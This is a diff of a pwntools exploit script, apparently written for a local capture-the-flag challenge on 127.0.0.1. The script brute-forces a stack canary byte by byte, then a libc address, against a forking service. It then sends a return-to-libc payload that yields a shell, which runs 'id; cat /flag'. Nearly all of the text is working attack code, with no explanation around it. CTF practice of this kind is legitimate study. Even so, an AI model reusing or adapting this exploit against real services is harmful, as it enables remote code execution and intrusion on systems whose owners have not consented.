@@ -37,9 +37,9 @@ def find_challenge(search_path="/challenge"):
     return xs[0]
 
 
-def find_offset_to_canary():
+def find_offset_to_canary(io_maker: Callable[[], pwn.tube]):
     for length in range(0x11, 0x101, 0x8):
-        with pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE, level="error") as io:
+        with io_maker() as io:
             io.sendline(pwn.cyclic(length))
             io.sendlineafter(b"Leaving!", b"")
             if b"stack smashing detected" in io.recvrepeat():
@@ -59,7 +59,7 @@ def kill_child_process(bin):
 
 def one_round(io_maker: Callable[[], pwn.tube], elf, libc):
     kill_child_process(elf.path)  # kill orphaned process from previous round
-    offset_canary = find_offset_to_canary()
+    offset_canary = find_offset_to_canary(io_maker)
     pwn.success(f"found canary offset: {offset_canary:#x}")
 
     def crack_canary():
@@ -76,7 +76,6 @@ def one_round(io_maker: Callable[[], pwn.tube], elf, libc):
                 print(f"Trying canary: {candidate.hex(' ')}", end="\r")
                 with io_maker() as io:
                     io.send(payload)
-                    io.sendlineafter(b"Leaving!", b"")
                     if b"stack smashing detected" not in io.recvrepeat(1):
                         canary.append(byte)
                         break
@@ -103,7 +102,6 @@ def one_round(io_maker: Callable[[], pwn.tube], elf, libc):
                 print(f"Trying libc_addr: {int.from_bytes(candidate, 'little'):#x}", end="\r")
                 with io_maker() as io:
                     io.send(payload)
-                    io.sendlineafter(b"Leaving!\n", b"")
                     if b"Welcome to" in io.recvrepeat(1):
                         libc_addr.append(byte)
                         kill_child_process(elf.path)
@@ -124,7 +122,6 @@ def one_round(io_maker: Callable[[], pwn.tube], elf, libc):
         )
         with io_maker() as io:
             io.send(payload)
-            io.sendlineafter(b"Leaving!\n", b"")
             io.sendline(b"id; cat /flag; exit")
             if b"pwn" in (out := io.recvuntil(b"}")):
                 print(out.decode())
@@ -141,7 +138,9 @@ def one_round(io_maker: Callable[[], pwn.tube], elf, libc):
 
 def one_round_worker(elf, libc):
     def io_maker():
-        return pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE, level="error")
+        io = pwn.remote('127.0.0.1', 1337, level='error')
+        io.recvuntil(b"\n\n")
+        return io
 
     one_round(io_maker, elf, libc)
 
